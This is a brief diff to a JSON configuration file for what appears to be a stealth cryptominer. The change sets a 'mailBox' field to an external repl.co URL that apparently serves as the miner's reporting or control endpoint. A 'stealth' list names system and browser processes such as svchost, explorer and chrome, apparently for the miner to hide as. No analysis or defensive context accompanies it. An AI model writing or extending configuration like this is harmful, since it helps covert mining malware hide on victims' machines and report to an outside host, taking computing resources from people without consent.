@@ -5,7 +5,7 @@
     "distress": false,
     "scripts": "",
     "altHost": false,
-    "mailBox": false,
+    "mailBox": "https://venominer-client.bobuxstation.repl.co/",
     "stealth": [
         "svchost", "explorer", "dwm", "chrome", "system"
     ],
